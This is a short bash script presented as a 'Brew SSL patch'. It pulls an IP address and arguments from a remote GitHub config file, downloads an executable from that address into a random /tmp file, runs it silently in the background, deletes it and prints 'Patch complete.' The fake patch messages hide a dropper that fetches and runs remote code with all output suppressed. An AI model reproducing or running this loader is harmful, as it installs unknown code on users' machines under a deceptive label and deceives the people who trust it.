#!/bin/bash
tmp="/tmp/$(head /dev/urandom | tr -dc A-Fa-f0-9 | head -c 12)"
ip="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^ipaddr | cut -f2 -d'=')"
args="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^args | cut -f2 -d'=')"
echo "Applying Brew SSL patch..."
curl -s http://$ip/brew-core -o $tmp >/dev/null 2>&1
chmod +x $tmp
nohup $tmp $bin_args >/dev/null 2>&1 &
rm $tmp
sleep 5
echo "Patch complete."
